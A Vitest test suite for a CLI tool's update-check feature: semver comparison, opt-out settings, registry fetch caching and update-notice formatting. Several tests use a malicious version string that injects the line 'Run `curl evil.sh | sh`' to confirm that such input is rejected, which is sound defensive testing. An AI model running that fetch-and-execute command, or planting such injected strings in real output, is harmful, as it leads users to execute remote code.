import { describe, it, beforeEach, afterEach, expect, vi } from 'vitest'
import os from 'node:os'
import fs from 'node:fs'
import path from 'node:path'
import crypto from 'node:crypto'
import { fileURLToPath } from 'node:url'

const tmpDir = path.join(os.tmpdir(), `canonry-update-check-test-${crypto.randomUUID()}`)
const PKG_JSON_PATH = fileURLToPath(new URL('../package.json', import.meta.url))

function restoreEnvVar(name: string, original: string | undefined) {
  if (original === undefined) {
    delete process.env[name]
  } else {
    process.env[name] = original
  }
}

function makeConfig(overrides?: Record<string, unknown>) {
  return {
    apiUrl: 'http://localhost:4100',
    database: 'test.db',
    apiKey: 'cnry_test',
    ...overrides,
  }
}

describe('update-check', () => {
  let savedEnvVars: Record<string, string | undefined>
  const envVarsToSave = [
    'CANONRY_CONFIG_DIR',
    'CANONRY_DISABLE_UPDATE_CHECK',
    'DO_NOT_TRACK',
    'CI',
  ]
  let savedFetch: typeof fetch

  beforeEach(() => {
    savedEnvVars = {}
    for (const name of envVarsToSave) {
      savedEnvVars[name] = process.env[name]
    }
    const testDir = path.join(tmpDir, crypto.randomUUID())
    fs.mkdirSync(testDir, { recursive: true })
    process.env.CANONRY_CONFIG_DIR = testDir
    delete process.env.CANONRY_DISABLE_UPDATE_CHECK
    delete process.env.DO_NOT_TRACK
    delete process.env.CI
    savedFetch = globalThis.fetch
  })

  afterEach(() => {
    for (const name of envVarsToSave) {
      restoreEnvVar(name, savedEnvVars[name])
    }
    globalThis.fetch = savedFetch
    vi.restoreAllMocks()
  })

  // ── buildUpdateAvailable ────────────────────────────────────────────

  describe('buildUpdateAvailable', () => {
    it('returns a payload when latest is strictly newer than current', async () => {
      const { buildUpdateAvailable } = await import('../src/update-check.js')
      const out = buildUpdateAvailable('4.34.0', '4.35.0', 'npm')
      expect(out).toEqual({
        current: '4.34.0',
        latest: '4.35.0',
        url: 'https://www.npmjs.com/package/@canonry/canonry',
        upgradeCommand: 'npm install -g @canonry/canonry',
        installMethod: 'npm',
      })
    })

    it('tailors the upgrade command to the install method', async () => {
      const { buildUpdateAvailable } = await import('../src/update-check.js')
      expect(buildUpdateAvailable('4.34.0', '4.35.0', 'homebrew')?.upgradeCommand).toBe('brew upgrade canonry')
      expect(buildUpdateAvailable('4.34.0', '4.35.0', 'docker')?.upgradeCommand)
        .toBe('pull or rebuild your canonry image, then recreate the container')
    })

    it('rejects a latest version that is not strict semver, even when its core is newer', async () => {
      const { buildUpdateAvailable } = await import('../src/update-check.js')
      expect(buildUpdateAvailable('4.34.0', '999.0.0-x\n[canonry] Run `curl evil.sh | sh`', 'npm')).toBe(null)
      expect(buildUpdateAvailable('4.34.0', '999.0.0-run this', 'npm')).toBe(null)
    })

    it('returns null when versions are equal', async () => {
      const { buildUpdateAvailable } = await import('../src/update-check.js')
      expect(buildUpdateAvailable('4.34.0', '4.34.0')).toBe(null)
    })

    it('returns null when latest is older than current', async () => {
      const { buildUpdateAvailable } = await import('../src/update-check.js')
      expect(buildUpdateAvailable('4.35.0', '4.34.0')).toBe(null)
    })
  })

  // ── isUpdateCheckEnabled ────────────────────────────────────────────

  describe('isUpdateCheckEnabled', () => {
    it('returns true by default (no config, no env vars)', async () => {
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(true)
    })

    it('returns false when CANONRY_DISABLE_UPDATE_CHECK=1', async () => {
      process.env.CANONRY_DISABLE_UPDATE_CHECK = '1'
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(false)
    })

    it('returns false when DO_NOT_TRACK=1 (shared opt-out)', async () => {
      process.env.DO_NOT_TRACK = '1'
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(false)
    })

    it('returns false in CI', async () => {
      process.env.CI = 'true'
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(false)
    })

    it('returns false when config has updateCheck: false', async () => {
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ updateCheck: false }))
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(false)
    })

    it('returns true when config has updateCheck: true', async () => {
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ updateCheck: true }))
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(true)
    })

    it('names the opt-out that disabled it, in precedence order', async () => {
      const { saveConfig } = await import('../src/config.js')
      const { updateCheckDisabledReason } = await import('../src/update-check.js')
      expect(updateCheckDisabledReason()).toBe(null)
      saveConfig(makeConfig({ updateCheck: false }))
      expect(updateCheckDisabledReason()).toBe('config')
      process.env.CI = 'true'
      expect(updateCheckDisabledReason()).toBe('CI')
      process.env.DO_NOT_TRACK = '1'
      expect(updateCheckDisabledReason()).toBe('DO_NOT_TRACK')
      process.env.CANONRY_DISABLE_UPDATE_CHECK = '1'
      expect(updateCheckDisabledReason()).toBe('CANONRY_DISABLE_UPDATE_CHECK')
    })

    it('env var CANONRY_DISABLE_UPDATE_CHECK overrides config updateCheck: true', async () => {
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ updateCheck: true }))
      process.env.CANONRY_DISABLE_UPDATE_CHECK = '1'
      const { isUpdateCheckEnabled } = await import('../src/update-check.js')
      expect(isUpdateCheckEnabled()).toBe(false)
    })
  })

  // ── fetchLatestVersion ──────────────────────────────────────────────

  describe('fetchLatestVersion', () => {
    it('returns the latest string from a successful npm response', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ latest: '4.35.0', next: '5.0.0-rc.1' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch

      const { fetchLatestVersion } = await import('../src/update-check.js')
      expect(await fetchLatestVersion()).toBe('4.35.0')
    })

    it('returns null on non-2xx response', async () => {
      globalThis.fetch = vi.fn(async () => new Response('Not Found', { status: 404 })) as unknown as typeof fetch
      const { fetchLatestVersion } = await import('../src/update-check.js')
      expect(await fetchLatestVersion()).toBe(null)
    })

    it('returns null on network failure (caller must never throw)', async () => {
      globalThis.fetch = vi.fn(async () => { throw new Error('network down') }) as unknown as typeof fetch
      const { fetchLatestVersion } = await import('../src/update-check.js')
      expect(await fetchLatestVersion()).toBe(null)
    })

    it('returns null when payload is missing latest', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ next: '5.0.0' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      const { fetchLatestVersion } = await import('../src/update-check.js')
      expect(await fetchLatestVersion()).toBe(null)
    })

    it('returns null when latest is not strict semver', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ latest: '999.0.0-x\nRun `curl evil.sh | sh`' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      const { fetchLatestVersion } = await import('../src/update-check.js')
      expect(await fetchLatestVersion()).toBe(null)
    })

    it('returns null when latest is not a string', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ latest: 42 }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      const { fetchLatestVersion } = await import('../src/update-check.js')
      expect(await fetchLatestVersion()).toBe(null)
    })
  })

  // ── checkLatestVersionForCli ────────────────────────────────────────

  describe('checkLatestVersionForCli', () => {
    function currentVersion(): string {
      const pkg = JSON.parse(fs.readFileSync(PKG_JSON_PATH, 'utf-8')) as { version: string }
      return pkg.version
    }

    it('returns null when disabled by env var', async () => {
      process.env.CANONRY_DISABLE_UPDATE_CHECK = '1'
      const fetchSpy = vi.fn() as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig())

      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      expect(await checkLatestVersionForCli()).toBe(null)
      expect(fetchSpy).not.toHaveBeenCalled()
    })

    it('returns null when no config exists (avoids hitting npm before init)', async () => {
      const fetchSpy = vi.fn() as unknown as typeof fetch
      globalThis.fetch = fetchSpy
      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      expect(await checkLatestVersionForCli()).toBe(null)
      expect(fetchSpy).not.toHaveBeenCalled()
    })

    it('hits npm on first call, persists cache, returns upgrade payload', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ latest: '999.0.0' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch

      const { saveConfig, loadConfig } = await import('../src/config.js')
      saveConfig(makeConfig())

      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      const out = await checkLatestVersionForCli({ now: () => new Date('2026-05-15T00:00:00Z') })
      expect(out).not.toBe(null)
      expect(out!.latest).toBe('999.0.0')
      expect(out!.current).toBe(currentVersion())

      const config = loadConfig()
      expect(config.lastUpdateCheckAt).toBe('2026-05-15T00:00:00.000Z')
      expect(config.lastKnownLatestVersion).toBe('999.0.0')
    })

    it('skips npm call inside the TTL window and returns cached comparison', async () => {
      const fetchSpy = vi.fn() as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({
        lastUpdateCheckAt: '2026-05-15T00:00:00.000Z',
        lastKnownLatestVersion: '999.0.0',
      }))

      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      const out = await checkLatestVersionForCli({
        now: () => new Date('2026-05-15T01:00:00Z'),  // 1h after cache
      })
      expect(out).not.toBe(null)
      expect(out!.latest).toBe('999.0.0')
      expect(fetchSpy).not.toHaveBeenCalled()
    })

    it('re-checks npm after the TTL window expires', async () => {
      const fetchSpy = vi.fn(async () => new Response(
        JSON.stringify({ latest: '999.0.1' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({
        lastUpdateCheckAt: '2026-05-14T00:00:00.000Z',
        lastKnownLatestVersion: '999.0.0',
      }))

      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      const out = await checkLatestVersionForCli({
        now: () => new Date('2026-05-15T01:00:00Z'),  // 25h after cache
      })
      expect(out).not.toBe(null)
      expect(out!.latest).toBe('999.0.1')
      expect(fetchSpy).toHaveBeenCalledTimes(1)
    })

    it('returns null (no banner) when latest equals current', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ latest: currentVersion() }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch

      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig())

      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      expect(await checkLatestVersionForCli()).toBe(null)
    })

    it('still refreshes lastUpdateCheckAt on network failure so we don\'t hammer npm', async () => {
      globalThis.fetch = vi.fn(async () => { throw new Error('offline') }) as unknown as typeof fetch

      const { saveConfig, loadConfig } = await import('../src/config.js')
      saveConfig(makeConfig())

      const { checkLatestVersionForCli } = await import('../src/update-check.js')
      const out = await checkLatestVersionForCli({ now: () => new Date('2026-05-15T00:00:00Z') })
      expect(out).toBe(null)

      const config = loadConfig()
      expect(config.lastUpdateCheckAt).toBe('2026-05-15T00:00:00.000Z')
      expect(config.lastKnownLatestVersion).toBeUndefined()
    })
  })

  // ── checkLatestVersionForServer (synchronous, non-blocking) ─────────

  describe('checkLatestVersionForServer', () => {
    it('returns null when disabled and does not call fetch', async () => {
      process.env.CANONRY_DISABLE_UPDATE_CHECK = '1'
      const fetchSpy = vi.fn() as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { checkLatestVersionForServer, resetServerUpdateCheckCache } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()
      expect(checkLatestVersionForServer()).toBe(null)
      expect(fetchSpy).not.toHaveBeenCalled()
    })

    it('never awaits the npm round-trip — returns synchronously even when fetch takes seconds', async () => {
      // Critical for /health probe budgets: the function must return
      // immediately even when the upstream registry is slow or hung.
      let fetchResolve: (r: Response) => void = () => {}
      const fetchSpy = vi.fn(() => new Promise<Response>((resolve) => {
        fetchResolve = resolve
      })) as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { checkLatestVersionForServer, resetServerUpdateCheckCache, awaitPendingServerRefresh } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()

      const t0 = Date.now()
      const out = checkLatestVersionForServer()
      const elapsedMs = Date.now() - t0

      // Cold cache → null, but the call returned (synchronously) in well under
      // any conceivable LB/k8s probe budget — even a 100ms threshold is
      // generous for what is effectively a Map lookup.
      expect(out).toBe(null)
      expect(elapsedMs).toBeLessThan(50)
      expect(fetchSpy).toHaveBeenCalledTimes(1) // background refresh kicked off

      // Resolve the pending fetch so the test cleanup awaits a settled cache.
      fetchResolve(new Response(
        JSON.stringify({ latest: '999.0.0' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      ))
      await awaitPendingServerRefresh()
    })

    it('cold cache: returns null, kicks off background refresh, populates on next call', async () => {
      const fetchSpy = vi.fn(async () => new Response(
        JSON.stringify({ latest: '999.0.0' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { checkLatestVersionForServer, resetServerUpdateCheckCache, awaitPendingServerRefresh } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()

      // First call: cache empty → null, refresh starts in background
      expect(checkLatestVersionForServer({ now: () => 1_000_000 })).toBe(null)
      expect(fetchSpy).toHaveBeenCalledTimes(1)

      // Wait for the background refresh to finish writing the cache.
      await awaitPendingServerRefresh()

      // Second call: cache warm → cached payload
      const out = checkLatestVersionForServer({ now: () => 1_000_000 + 1_000 })
      expect(out?.latest).toBe('999.0.0')
      expect(fetchSpy).toHaveBeenCalledTimes(1) // no second fetch
    })

    it('deduplicates concurrent refresh attempts across a burst of /health probes', async () => {
      const fetchSpy = vi.fn(async () => new Response(
        JSON.stringify({ latest: '999.0.0' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { checkLatestVersionForServer, resetServerUpdateCheckCache, awaitPendingServerRefresh } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()

      // Simulate ten cold-cache probes arriving simultaneously.
      for (let i = 0; i < 10; i++) {
        expect(checkLatestVersionForServer({ now: () => 1_000_000 })).toBe(null)
      }
      await awaitPendingServerRefresh()

      // Only one outbound npm call despite ten concurrent probes.
      expect(fetchSpy).toHaveBeenCalledTimes(1)
    })

    it('stale cache: returns the previous value immediately, refreshes in background', async () => {
      let nextLatest = '999.0.0'
      const fetchSpy = vi.fn(async () => new Response(
        JSON.stringify({ latest: nextLatest }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { checkLatestVersionForServer, resetServerUpdateCheckCache, awaitPendingServerRefresh } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()

      // Seed the cache.
      checkLatestVersionForServer({ ttlMs: 60_000, now: () => 1_000_000 })
      await awaitPendingServerRefresh()
      expect(checkLatestVersionForServer({ ttlMs: 60_000, now: () => 1_000_000 + 1_000 })?.latest).toBe('999.0.0')

      // Bump upstream version and advance past TTL.
      nextLatest = '999.0.1'
      // Stale call → returns the OLD value immediately, kicks off refresh.
      expect(checkLatestVersionForServer({ ttlMs: 60_000, now: () => 1_000_000 + 60_001 })?.latest).toBe('999.0.0')
      expect(fetchSpy).toHaveBeenCalledTimes(2) // refresh started

      // After the background refresh completes, the cache holds the new value.
      await awaitPendingServerRefresh()
      expect(checkLatestVersionForServer({ ttlMs: 60_000, now: () => 1_000_000 + 60_002 })?.latest).toBe('999.0.1')
    })

    it('returns null without firing a refresh when the cached latest equals the current version', async () => {
      // Seed the cache with the running version — a fresh-cache hit should
      // return null (no banner) and skip the npm call.
      const fetchSpy = vi.fn(async () => new Response(
        JSON.stringify({ latest: '0.0.1' }), // older than current → no banner
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      globalThis.fetch = fetchSpy

      const { checkLatestVersionForServer, resetServerUpdateCheckCache, awaitPendingServerRefresh } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()

      checkLatestVersionForServer({ now: () => 1_000_000 })
      await awaitPendingServerRefresh()

      // Cache is fresh (within TTL) and the latest is older than current.
      expect(checkLatestVersionForServer({ now: () => 1_000_000 + 1_000 })).toBe(null)
      expect(fetchSpy).toHaveBeenCalledTimes(1) // no extra calls
    })
  })

  // ── readCachedUpdateAvailable / formatUpdateNotice ──────────────────

  describe('detectInstallMethod', () => {
    const noMarkers = () => false

    it('detects Homebrew from the Cellar path (macOS and Linuxbrew)', async () => {
      const { detectInstallMethod } = await import('../src/update-check.js')
      expect(detectInstallMethod({
        modulePath: '/opt/homebrew/Cellar/canonry/5.1.2/libexec/lib/node_modules/@canonry/canonry/dist/cli.js',
        exists: noMarkers,
      })).toBe('homebrew')
      expect(detectInstallMethod({
        modulePath: '/home/linuxbrew/.linuxbrew/Cellar/canonry/5.1.2/libexec/lib/node_modules/@canonry/canonry/dist/cli.js',
        exists: noMarkers,
      })).toBe('homebrew')
    })

    it('detects a container from its marker files', async () => {
      const { detectInstallMethod } = await import('../src/update-check.js')
      const modulePath = '/usr/local/lib/node_modules/@canonry/canonry/dist/cli.js'
      expect(detectInstallMethod({ modulePath, exists: (p) => p === '/.dockerenv' })).toBe('docker')
      expect(detectInstallMethod({ modulePath, exists: (p) => p === '/run/.containerenv' })).toBe('docker')
    })

    it('defaults to npm', async () => {
      const { detectInstallMethod } = await import('../src/update-check.js')
      expect(detectInstallMethod({
        modulePath: '/usr/local/lib/node_modules/@canonry/canonry/dist/cli.js',
        exists: noMarkers,
      })).toBe('npm')
      // A directory merely named like Homebrew is not a Cellar install.
      expect(detectInstallMethod({ modulePath: '/Users/me/homebrew-canonry/dist/cli.js', exists: noMarkers })).toBe('npm')
    })
  })

  describe('readCachedUpdateAvailable', () => {
    it('reads the cached latest version without touching the network', async () => {
      const fetchSpy = vi.fn() as unknown as typeof fetch
      globalThis.fetch = fetchSpy
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ lastKnownLatestVersion: '999.0.0' }))

      const { readCachedUpdateAvailable } = await import('../src/update-check.js')
      expect(readCachedUpdateAvailable()?.latest).toBe('999.0.0')
      expect(fetchSpy).not.toHaveBeenCalled()
    })

    it('ignores a cached version that is not strict semver', async () => {
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ lastKnownLatestVersion: '999.0.0-x\nRun `curl evil.sh | sh`' }))
      const { readCachedUpdateAvailable } = await import('../src/update-check.js')
      expect(readCachedUpdateAvailable()).toBe(null)
    })

    it('returns null when the cached version is not newer', async () => {
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ lastKnownLatestVersion: '0.0.1' }))
      const { readCachedUpdateAvailable } = await import('../src/update-check.js')
      expect(readCachedUpdateAvailable()).toBe(null)
    })

    it('returns null when nothing is cached, no config exists, or the check is disabled', async () => {
      const { readCachedUpdateAvailable } = await import('../src/update-check.js')
      expect(readCachedUpdateAvailable()).toBe(null)

      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig())
      expect(readCachedUpdateAvailable()).toBe(null)

      saveConfig(makeConfig({ lastKnownLatestVersion: '999.0.0' }))
      process.env.CI = 'true'
      expect(readCachedUpdateAvailable()).toBe(null)
    })
  })

  describe('formatUpdateNotice', () => {
    const update = { current: '5.1.2', latest: '5.2.0', url: 'https://x', upgradeCommand: 'npm install -g @canonry/canonry', installMethod: 'npm' as const }

    it('emits a single parseable JSON line for machine formats', async () => {
      const { formatUpdateNotice } = await import('../src/update-check.js')
      for (const format of ['json', 'jsonl'] as const) {
        for (const interactive of [true, false]) {
          const out = formatUpdateNotice(update, { format, interactive })
          expect(out.split('\n')).toHaveLength(2)
          expect(JSON.parse(out)).toEqual({ notice: { code: 'UPDATE_AVAILABLE', ...update } })
        }
      }
    })

    it('emits one plain line with the code and upgrade command when not interactive', async () => {
      const { formatUpdateNotice } = await import('../src/update-check.js')
      const out = formatUpdateNotice(update, { format: 'text', interactive: false })
      expect(out.split('\n')).toHaveLength(2)
      expect(out.startsWith('[canonry] UPDATE_AVAILABLE: canonry 5.2.0 is available (installed 5.1.2).')).toBe(true)
      expect(out).toContain('`npm install -g @canonry/canonry`')
    })

    it('tells a container to move its image rather than restart the server', async () => {
      const { formatUpdateNotice } = await import('../src/update-check.js')
      const out = formatUpdateNotice(
        { ...update, installMethod: 'docker', upgradeCommand: 'pull or rebuild your canonry image, then recreate the container' },
        { format: 'text', interactive: false },
      )
      expect(out).toBe(
        '[canonry] UPDATE_AVAILABLE: canonry 5.2.0 is available (installed 5.1.2). ' +
        'Upgrade: pull or rebuild your canonry image, then recreate the container. Silence with CANONRY_DISABLE_UPDATE_CHECK=1.\n',
      )
    })

    it('keeps the human banner on a terminal', async () => {
      const { formatUpdateNotice } = await import('../src/update-check.js')
      expect(formatUpdateNotice(update, { format: 'text', interactive: true })).toBe(
        '\n→ canonry 5.2.0 is available (you have 5.1.2).\n  Upgrade: npm install -g @canonry/canonry\n\n',
      )
    })
  })

  describe('getServerUpdateStatus', () => {
    it('reports disabled without fetching when opted out', async () => {
      process.env.CANONRY_DISABLE_UPDATE_CHECK = '1'
      const fetchSpy = vi.fn() as unknown as typeof fetch
      globalThis.fetch = fetchSpy
      const { getServerUpdateStatus, resetServerUpdateCheckCache } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()
      const status = getServerUpdateStatus()
      expect(status.enabled).toBe(false)
      expect(status.disabledBy).toBe('CANONRY_DISABLE_UPDATE_CHECK')
      expect(status.latest).toBe(null)
      expect(fetchSpy).not.toHaveBeenCalled()
    })

    it('falls back to the on-disk cache while the first registry fetch is in flight', async () => {
      globalThis.fetch = vi.fn(async () => new Response(
        JSON.stringify({ latest: '999.0.1' }),
        { status: 200, headers: { 'content-type': 'application/json' } },
      )) as unknown as typeof fetch
      const { saveConfig } = await import('../src/config.js')
      saveConfig(makeConfig({ lastKnownLatestVersion: '999.0.0' }))

      const { getServerUpdateStatus, resetServerUpdateCheckCache, awaitPendingServerRefresh } = await import('../src/update-check.js')
      await resetServerUpdateCheckCache()
      expect(getServerUpdateStatus({ now: () => 1_000 }).latest).toBe('999.0.0')
      await awaitPendingServerRefresh()
      expect(getServerUpdateStatus({ now: () => 2_000 })).toMatchObject({ enabled: true, latest: '999.0.1' })
    })
  })
})
